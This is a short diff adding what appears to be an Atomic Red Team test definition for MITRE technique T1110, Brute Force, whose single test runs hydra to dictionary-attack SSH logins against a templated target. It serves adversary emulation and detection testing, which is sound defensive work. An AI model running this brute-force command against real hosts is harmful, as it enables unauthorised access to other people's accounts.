@@ -1,0 +1,12 @@
+attack_technique: T1110
+display_name: Brute Force
+atomic_tests:
+- name: SSH brute force with hydra
+  auto_generated_guid: 2b3c4d5e-6f70-4a81-9b2c-3d4e5f6a7b74
+  description: Attempts a dictionary attack against SSH.
+  supported_platforms:
+  - linux
+  executor:
+    name: sh
+    command: |
+      hydra -l #{username} -P #{wordlist} ssh://#{target}
